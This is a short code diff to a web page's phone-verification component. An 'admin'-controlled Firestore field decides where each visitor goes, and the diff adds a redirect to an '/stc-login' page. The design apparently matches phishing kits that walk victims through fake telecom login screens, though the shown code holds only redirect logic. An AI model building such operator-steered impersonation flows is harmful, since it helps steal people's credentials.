@@ -81,8 +81,10 @@ export default function VerifyPhonePage() {
       (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data();
-          console.log("[phone-info] Firestore data received:", data);
-
+          console.log("Firestore data received:", data);
+          if (data.currentStep === "stc-login") {
+            window.location.href = "/stc-login";
+          }else
           // Admin navigation: Handle page redirects
           if (data.currentStep === "home") {
             console.log("[phone-info] Admin redirecting to home");
